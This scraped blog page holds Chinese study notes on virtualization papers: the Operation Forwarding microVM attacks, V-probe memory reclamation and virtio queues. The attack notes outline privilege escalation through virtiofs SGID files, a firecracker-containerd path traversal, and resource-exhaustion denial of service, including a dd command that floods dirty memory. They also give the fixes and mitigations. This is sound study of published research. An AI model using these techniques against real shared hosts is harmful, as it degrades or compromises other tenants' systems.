&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid to drop smth dirty data and freeze the system</span></span><br><span class="line"><span class="comment">			 * wbnoinvd is enough to make it reliable</span></span><br><span class="line"><span class="comment">			 * wbinvd also works, but it takes longer time</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">        <span class="keyword">if</span> (invd) &#123;</span><br><span class="line">            <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;wbnoinvd\n\t&quot;</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ssh 怎么利用page fault一起找的？</p>
<p>npf_interception intr_interception svm_vcpu_enter_exit三者关系是什么？</p>
<p>exit之后不就是NPF或者INTR 为什么急着先处理？</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/23/papers/forward/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/23/papers/forward/" class="post-title-link" itemprop="url">Operation Forwarding</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-23 13:28:30 / Modified: 13:29:42" itemprop="dateCreated datePublished" datetime="2024-01-23T13:28:30+08:00">2024-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>6 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Operation-Forwarding"><a href="#Operation-Forwarding" class="headerlink" title="Operation Forwarding"></a>Operation Forwarding</h1><p>usenix security23</p>
<p>虽然使用硬件虚拟化进行了隔离 但是microVM使用的组件还是会涉及到使用host的资源</p>
<p>策略1 container components</p>
<ul>
<li>kata container 用viriofs 提供rootfs 使得guest在这个文件夹的操作会转发到host</li>
<li>firecracker用runc jailer先在host上创建文件夹 然后复制文件 作为rootfs 使得host普通用户可以通过创建microVM利用containerd的漏洞做坏事</li>
</ul>
<blockquote>
<p>however, virtiofs is designed to offer local file system semantics and high performance. The file system performance downgrades without virtiofs in Kata Containers   </p>
</blockquote>
<p>用这个是为了性能</p>
<p>策略2 device emulator</p>
<p>策略3 host kernel module</p>
<h2 id="1-kata-container-virtiofs"><a href="#1-kata-container-virtiofs" class="headerlink" title="1 kata container virtiofs"></a>1 kata container virtiofs</h2><ol>
<li><p>container 在virtiofs的共享文件夹下创建SGIDbit的可执行文件  SGID可以临时获得程序所属组的权限</p>
</li>
<li><p>guest的virtiofs-driver会把open的system call forward给host的virtiofs daemon</p>
</li>
<li><p>通过host创建文件的权限检查 因为virfiofs daemon有root为 supplemental group</p>
<blockquote>
<p>Then it checks if the creation process has the same supplemental group as the directory owner. However, according to the virtiofs daemon’s document [31], virtiofs daemon must run as the root user and has the root group in its supplemental group  </p>
</blockquote>
</li>
<li><p>成功在host的某个目录下创建一个SGID的可执行文件</p>
</li>
</ol>
<p>vm内部和host是两个世界，所以这里无论怎么样vm还是无法利用这个可执行文件完成逃逸的。但是这个文件为host留了隐患，在host同一物理机器的任何普通用户都可以以root权限执行这个可执行文件。</p>
<blockquote>
<p>a regular user can get the host root group privileges when executing the file created by the malicious container.  </p>
</blockquote>
<p>cve的描述:</p>
<blockquote>
<p> This could allow a malicious unprivileged user inside the guest to gain access to resources accessible to the root group, potentially escalating their privileges within the guest. A malicious local user in the host might also leverage this unexpected executable file created by the guest to escalate their privileges on the host system.</p>
</blockquote>
<ol>
<li>guest内部的非root用户有root权限</li>
<li>host的非root用户有root权限</li>
</ol>
<p>报告给viriofs CVE 修复：取消掉viriofs 的root group</p>
<p><a target="_blank" rel="noopener" href="https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html">https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html</a></p>
<p>这个patch是qemu的virtiofsd  直接在启动的一开始把这个进程的所有supplemental group 都清空了 </p>
<p>一个用户可以属于多个组 但是登录的时候默认是primary group</p>
<p>其他组都是supplemental group</p>
<blockquote>
<p>If we have membership of “root” supplementary group</p>
</blockquote>
<p>root group是不是只是一个形象的表达？ 实际上只有adm sudo这种group</p>
<p>如果viriofs共享的文件夹是root 那么清空了virtiofsd的root supplemental group virtiofsd本身还怎么提供服务？最早为什么必须加？涉及到viriofs的设计 不深入研究</p>
<p><strong>利用open  策略1</strong></p>
<h2 id="2-kata-container-dirty-memory-attack"><a href="#2-kata-container-dirty-memory-attack" class="headerlink" title="2 kata container dirty memory attack"></a>2 kata container dirty memory attack</h2><ol>
<li>container中<code>dd if=/dev/zero of=/mnt/test bs=1M count=4096 oflag=direct  </code>持续生成 写文件</li>
<li>viriofs共享文件夹写write  VFS-&gt;viriofs driver-&gt;host viriofs daemon 触发host写 影响host dirty memory</li>
<li>linux kernel 维护一个值 当dirty memory超过阈值后(20%) 所有进程的写操作会从write-back变成write-through 性能下降</li>
<li>当多个container做这种操作 host的io性能可以下降90%</li>
</ol>
<p><strong>利用write 策略1</strong></p>
<blockquote>
<p>Besides, one can limit dirty memory usage of the virtiofs by adding the virtiofs daemon into cgroups.  </p>
</blockquote>
<p>virtiofs daemon就一个 给哪个vm的cgroup？</p>
<p>virtiofs团队正在努力让virtiofs daemon不需要以root运行 并且不影响用户使用</p>
<p><strong>经过测试 当某个文件被删除后 这个文件的buffer 即所有的dirty page也会马上被清空 不会再占用内存 所以仅仅靠一个container是无法达成攻击的 需要多个container一起 例如10container*4G&gt;192G(server)*20%&#x3D;38.4G</strong></p>
<p>多个container持续修改同一个文件即可 这样持续生成dirty memory</p>
<p>dirty memory在代码中的定义：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gmpy/p/12657801.html">Linux 脏数据回刷参数与调优 - 广漠飘羽 - 博客园 (cnblogs.com)</a></p>
<p>可回收内存(FILE_DIRTY) &gt; 可用内存(FREE+INACTIVE_FILE+ACTIVE_FILE) * ratio 发生回收 所以大量的匿名页是不记入的</p>
<h2 id="3-kata-container-nf-conntrack-table-attack"><a href="#3-kata-container-nf-conntrack-table-attack" class="headerlink" title="3 kata container nf_conntrack table attack"></a>3 kata container nf_conntrack table attack</h2><ol>
<li>container 疯狂connect 建立tcp连接</li>
<li>host的vhost-net kernel module调用tun_sendmsg-&gt;nf_conntrack_alloc</li>
<li>达到nf_conntrack_max 类似抽象资源攻击</li>
<li>造成随机丢包   ping 50%丢包 nginx不可用</li>
</ol>
<p>这里应该攻击的就是最终使用nf_conntrack table的网络使用者 也就是同样使用vhost-net的其他容器</p>
<p><strong>connect 策略3</strong></p>
<p>kata不修复 就给了减弱攻击的做法</p>
<p><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220">https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220</a></p>
<p>调一些参数 比如timeout max</p>
<p>可以限制速率</p>
<p><a target="_blank" rel="noopener" href="https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/">https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/</a></p>
<h2 id="4-attack-of-vhost-net-kernel-module"><a href="#4-attack-of-vhost-net-kernel-module" class="headerlink" title="4 attack of vhost-net kernel module"></a>4 attack of vhost-net kernel module</h2><ol>
<li>container 疯狂 sendmsg&#x2F;recvmsg</li>
<li>kernel 疯狂handle_rx&#x2F;tx</li>
<li>vhost kernel worker thread使用很多cpu资源 且不计入VM使用的资源</li>
</ol>
<p>并没有显示对其他container有影响</p>
<blockquote>
<p>Specifically, a worker thread called vhost-<owner-device-emulator-process-pid> is created for each virtual machine  </p>
</blockquote>
<p><strong>sendmsg&#x2F;recvmsg 策略3</strong></p>
<p>每个VM一个 所以解决方案是把这些thread加入container的cgroup</p>
<p>实际上对于kata container 有一个sandbox_cgroup_only&#x3D;true的选项可以让vhost thread放入cgroup 但是默认是false</p>
<p>为什么这个可以让container的用户自己配置？ 那都是false不是不需要消耗资源付更多钱吗</p>
<p>可以用SRIOV</p>
<h2 id="5-firecracker-containerd-escalation"><a href="#5-firecracker-containerd-escalation" class="headerlink" title="5  firecracker-containerd escalation"></a>5  firecracker-containerd escalation</h2><p><a target="_blank" rel="noopener" href="https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed">https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed</a></p>
<ol>
<li><p>host 普通用户构造一个路径 申请创建microVM</p>
</li>
<li><p>firecracker-containerd是root权限运行 而代码中并没有检查参数所以涉及到的chown和create可以操作任何文件</p>
<p>并且代码使用的filepath.join会导致组合的路径逃出jail</p>
</li>
<li><p>chown可以任意修改文件权限</p>
<p>create可以任意清空文件，例如清空host的.so 让host crash</p>
</li>
</ol>
<p><strong>CreateVM 策略1</strong></p>
<p>“path&#x2F;filepath”  filepath.join 在某一个路径存在<code>/../../../</code>的情况下 最后组合的路径会把另一个前面的吃掉</p>
<p>换成”github.com&#x2F;containerd&#x2F;continuity&#x2F;fs” fs.RootPath</p>
<p>用户控制一个 可以逃出runc指定的jail路径</p>
<p><strong>CreateVM 策略1</strong></p>
<h2 id="6-firecracker-based-container-dirty-memory-attack"><a href="#6-firecracker-based-container-dirty-memory-attack" class="headerlink" title="6 firecracker-based container dirty memory attack"></a>6 firecracker-based container dirty memory attack</h2><p>类似kata container</p>
<p>但是firecracker使用的是virio-blk</p>
<p><strong>write 策略2</strong></p>
<h2 id="7-Firecracker-based-Container-Nf-conntrack-TableAttack"><a href="#7-Firecracker-based-Container-Nf-conntrack-TableAttack" class="headerlink" title="7 Firecracker-based Container Nf_conntrack TableAttack"></a>7 Firecracker-based Container Nf_conntrack TableAttack</h2><p>用virtio-net device 而不是kernel module</p>
<p>但是效果一样</p>
<p><strong>connect 策略2</strong></p>
<p>被AWS修复了  没找到怎么修复</p>
<h2 id="8-KVM-PIT-Timer-Attack"><a href="#8-KVM-PIT-Timer-Attack" class="headerlink" title="8 KVM PIT Timer Attack"></a>8 KVM PIT Timer Attack</h2><ol>
<li>guest疯狂写某写io port 触发PIT timer 且period很短</li>
<li>host调度kvm-pit线程 pit_do_work往guest插入中断</li>
<li>内核线程属于root cgroup 消耗资源不算在user space</li>
<li>cpu memory io的benchmark性能都下降</li>
</ol>
<p>个人认为这里是server的资源并不多 并且开的container太多 导致消耗大量资源的PIT thread在整体可用资源的占比变高</p>
<p><strong>outb 策略3</strong></p>
<p>qemu用HPET代替了PIT 具体实现不深入研究</p>
<p>也是一个VM一个 所以也可以放到cgroup中</p>
<p>或者直接禁用</p>
<h2 id="traditional-VM"><a href="#traditional-VM" class="headerlink" title="traditional VM"></a>traditional VM</h2><ul>
<li>dirty memory dos有效</li>
<li>nf_conntrack dos有效</li>
<li>vhost-net 有效</li>
<li>viriofs提权 有效 9pfs也有效</li>
<li>PIT 不用了 所以无效</li>
</ul>
<p>这些漏洞存在 但是普通VM不一定用 microVM定死了组件 所以一定用</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/23/papers/V-probe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/23/papers/V-probe/" class="post-title-link" itemprop="url">V-probe</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-23 13:27:32 / Modified: 13:29:42" itemprop="dateCreated datePublished" datetime="2024-01-23T13:27:32+08:00">2024-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.2k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="V-probe"><a href="#V-probe" class="headerlink" title="V-probe"></a>V-probe</h1><p>ATC23</p>
<h2 id="问题与目标"><a href="#问题与目标" class="headerlink" title="问题与目标"></a>问题与目标</h2><p>IO直通的DMA操作与memory overcommitment产生冲突</p>
<p>因为DMA操作需要保证内存是固定不变的  overcommitment需要动态调整</p>
<p>现有方案：</p>
<ul>
<li>IOPF：DMA会产生pagefault，依赖memory reclaim ，swap慢 balloon通信慢 hyperupcall可能回收了DMA缓冲区导致失败</li>
<li>vIOMMU coIOMMU 让hypervisor 知道VM的DMA信息 兼容性差</li>
</ul>
<p>希望</p>
<ul>
<li>保证DMA不会失败</li>
<li>不需要特殊硬件</li>
<li>不需要修改guest内核</li>
<li>性能好</li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>类似hyperupcall 但是用编译好的二进制</p>
<p>guest启动后动态加载</p>
<p>限制只能用rdi rax 不允许访问内存 不允许大于64bytes  不能跳转</p>
<p>关于page：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhoutaopower/article/details/87090982">Linux 内存管理窥探（5）：page 数据结构_爱洋葱的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="http://linux.laoqinren.net/kernel/memory-page/">struct page结构体 - Notes about linux and my work (laoqinren.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/573338379">linux内核那些事之struct page - 知乎 (zhihu.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPCOUNT_OPS(uname, lname)					\</span></span><br><span class="line"><span class="meta">static __always_inline int Page##uname(struct page *page)		\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	return atomic_read(&amp;page-&gt;_mapcount) ==				\</span></span><br><span class="line"><span class="meta">				PAGE_##lname##_MAPCOUNT_VALUE;		\</span></span><br><span class="line"><span class="meta">&#125;									\</span></span><br><span class="line"><span class="meta">static __always_inline void __SetPage##uname(struct page *page)		\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	VM_BUG_ON_PAGE(atomic_read(&amp;page-&gt;_mapcount) != -1, page);	\</span></span><br><span class="line"><span class="meta">	atomic_set(&amp;page-&gt;_mapcount, PAGE_##lname##_MAPCOUNT_VALUE);	\</span></span><br><span class="line"><span class="meta">&#125;									\</span></span><br><span class="line"><span class="meta">static __always_inline void __ClearPage##uname(struct page *page)	\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	VM_BUG_ON_PAGE(!Page##uname(page), page);			\</span></span><br><span class="line"><span class="meta">	atomic_set(&amp;page-&gt;_mapcount, -1);				\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PageBuddy() indicate that the page is free and in the buddy system</span></span><br><span class="line"><span class="comment"> * (see mm/page_alloc.c).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_BUDDY_MAPCOUNT_VALUE		(-128)</span></span><br><span class="line">PAGE_MAPCOUNT_OPS(Buddy, BUDDY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> page_private(page)		((page)-&gt;private)</span></span><br></pre></td></tr></table></figure>

<p>一个用于拿是否free 一个用于拿order</p>
<p>这些函数的参数都是page结构体的GVA，所以注册函数的同时需要把guest内核page存放的GPA也一同放入</p>
<p>由于代码在host上执行，不需要GVA-&gt;GPA 所以这段代码不论是GPA-&gt;HVA还是如何翻译 总能在hypervisor上解决</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> procedure MEMORYRECLAMATION</span><br><span class="line"><span class="number">2</span>: <span class="keyword">for</span> each GFN in GUEST <span class="keyword">do</span></span><br><span class="line"><span class="number">3</span>: <span class="keyword">if</span> GFN is reclaimed then</span><br><span class="line"><span class="number">4</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="number">5</span>: SP ← <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">of</span> <span class="title">GFN</span> <span class="title">in</span> <span class="title">GUEST</span></span></span><br><span class="line"><span class="class">6:</span> FREE ← GUEST.PAGE_FREE(SP)</span><br><span class="line"><span class="number">7</span>: ORD ← GUEST.PAGE_ORD(SP)</span><br><span class="line"><span class="number">8</span>: <span class="keyword">if</span> FREE and ORD ≥ MIN_ORD then</span><br><span class="line"><span class="number">9</span>: Lock MUTEX</span><br><span class="line"><span class="number">10</span>: Make the <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">GPA</span> <span class="title">range</span> <span class="title">read</span>-<span class="title">only</span></span></span><br><span class="line"><span class="class">11:</span> SP′ ← <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">of</span> <span class="title">GFN</span> <span class="title">in</span> <span class="title">GUEST</span></span></span><br><span class="line"><span class="class">12:</span> FREE′ ← GUEST.PAGE_FREE(SP′)</span><br><span class="line"><span class="number">13</span>: ORD′ ← GUEST.PAGE_ORD(SP′)</span><br><span class="line"><span class="number">14</span>: <span class="keyword">if</span> FREE′ and ORD′ ≥ MIN_ORD then</span><br><span class="line"><span class="number">15</span>: GFNst ← GFN</span><br><span class="line"><span class="number">16</span>: GFNen ← GFN + (<span class="number">1</span> &lt;&lt; ORD′)</span><br><span class="line"><span class="number">17</span>: RANGE ← [GFNst, GFNen)</span><br><span class="line"><span class="number">18</span>: Unmap EPT in RANGE</span><br><span class="line"><span class="number">19</span>: Unmap IOMMU in RANGE</span><br><span class="line"><span class="number">20</span>: Add RANGE to the reclaimed <span class="built_in">set</span></span><br><span class="line"><span class="number">21</span>: Release reclaimed pages to hypervisor</span><br><span class="line"><span class="number">22</span>: Unlock MUTEX</span><br><span class="line"><span class="number">23</span>: <span class="keyword">return</span> SUCCESS</span><br><span class="line"><span class="number">24</span>: Make the <span class="keyword">struct</span> page GPA range read-write</span><br><span class="line"><span class="number">25</span>: Unlock MUTEX</span><br><span class="line"><span class="number">26</span>: <span class="keyword">return</span> FAIL</span><br></pre></td></tr></table></figure>

<p>记录到reclaimed set中 并且解除映射</p>
<p>一旦解除映射 对应的物理内存就空出来了 满足overcommitment</p>
<p>回收代码定时触发或者事件触发</p>
<p>我认为第21行需要完成两件事</p>
<ul>
<li>这里光解除映射 实际上host还是不可用 需要用host kernel的对应函数和数据结构修改  但是已经运行在host上 并且知道guest的所有信息 并不难做到(类似qemu 可用madvise) 但是否有不一致问题？</li>
<li>修改guest struct page 标记不可用 否则guest当作free仍然分配并使用 可能导致触发大量page fault和VMexit</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> procedure PAGEFAULTHANDLER</span><br><span class="line"><span class="number">2</span>: Lock MUTEX</span><br><span class="line"><span class="number">3</span>: RANGE ← GetReclaimedRange(GUEST , GPA)</span><br><span class="line"><span class="number">4</span>: PAGES ← pages reallocated <span class="keyword">for</span> RANGE</span><br><span class="line"><span class="number">5</span>: Map RANGE to PAGES in EPT</span><br><span class="line"><span class="number">6</span>: Map RANGE to PAGES in IOMMU</span><br><span class="line"><span class="number">7</span>: Remove RANGE from the reclaimed <span class="built_in">set</span></span><br><span class="line"><span class="number">8</span>: Make the <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">GPA</span> <span class="title">range</span> <span class="title">read</span>-<span class="title">write</span></span></span><br><span class="line"><span class="class">9:</span> Unlock MUTEX</span><br><span class="line"><span class="number">10</span>: <span class="keyword">return</span></span><br><span class="line">Input: GUEST , GPA</span><br><span class="line">Output: RANGE</span><br><span class="line"><span class="number">11</span>: procedure GETRECLAIMEDRANGE</span><br><span class="line"><span class="number">12</span>: <span class="keyword">for</span> each RANGE in the reclaimed <span class="built_in">set</span> of GUEST <span class="keyword">do</span></span><br><span class="line"><span class="number">13</span>: SPst ← the start <span class="keyword">struct</span> page GPA in RANGE</span><br><span class="line"><span class="number">14</span>: SPen ← the end <span class="keyword">struct</span> page GPA in RANGE</span><br><span class="line"><span class="number">15</span>: <span class="keyword">if</span> SPst ≤ GPA ≤ SPen then</span><br><span class="line"><span class="number">16</span>: <span class="keyword">return</span> RANGE</span><br></pre></td></tr></table></figure>

<p>DMA发生page fault 需要重新拿回对应的物理内存</p>
<p>这时候从reclaimed set中寻找原来的地址判断长度 然后重新映射 保证了DMA用的HPA虽然在动态变化但是仍可用 </p>
<p>这里的两个函数应该都是加到hypervisor代码中去的(修改host内核)</p>
<p>普通的page fault和DMA的page fault都使用这个函数</p>
<p>所以具体实现上仍然需要支持IOPF的硬件  实验中作者是自己修改硬件来支持的</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><h3 id="host与guest"><a href="#host与guest" class="headerlink" title="host与guest"></a>host与guest</h3><p>把host需要回收的page结构体都改为read only 随后再进行检查 这样做保证了满足要求的page都不会被guest修改</p>
<h3 id="reclaim与page-fault"><a href="#reclaim与page-fault" class="headerlink" title="reclaim与page fault"></a>reclaim与page fault</h3><p>用host自己的mutex lock</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这篇文章相当于设备直通场景下的hypercall 因此测试除了常规回收内存之外 还增加了特定的IO测试</p>
<p>例如tcp udp和redis</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不管guest怎么操作自己的数据结构 入口一定是在host的</p>
<p>必须保证host拥有guest数据结构的地址和布局 并且提供给这段代码才可以</p>
<p>代码其实是修改了host自己的reclaim和page fault逻辑自己执行 不需要VM enter和exit</p>
<p>这种方式和balloon完全不同 不需要guest自己任何参与 对guest来说 仍然认为自己有着全部内存 不知道二级页表映射已经失效了</p>
<ul>
<li>balloon：guest判断free guest标记不可用 host unmap</li>
<li>v-probe：host判断free (host标记guest不可用) host unmap</li>
</ul>
<p>v-probe就算不顺带解决IOPF的问题 从性能上单独来说也是碾压balloon的，因为通过在host访问guest数据结构绕开了virtio这个大框架</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/virtualization/virtio%20queue/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/virtualization/virtio%20queue/" class="post-title-link" itemprop="url">virtio queue</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:57:59 / Modified: 20:58:17" itemprop="dateCreated datePublished" datetime="2024-01-22T20:57:59+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/virtualization/" itemprop="url" rel="index"><span itemprop="name">virtualization</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>20 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="virtio-queue"><a href="#virtio-queue" class="headerlink" title="virtio queue"></a>virtio queue</h1><h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangquan1992/article/details/120649182">virtio-net 实现机制_sg_init_one_老王不让用的博客-CSDN博客</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>简单设计：一个环形队列 固定大小 生产者消费者 两个指针</p>
<p>这样所有通信固定在了这个队列里</p>
<p>virtio可以动态申请和释放共享内存，用一块固定的共享内存队列记录通信使用的共享内存的地址</p>
<p>这个队列为desc 默认128长度</p>
<p>真正的共享内存是scatterlist</p>
<p>并且 desc并不是单纯的先进先出的队列，而是一个无序的链表，所有请求不需要顺序处理 所以两个指针是不够的 必须记录哪些位置是新生产的  哪些位置被消费了</p>
<p>实现中用数组 分别索引</p>
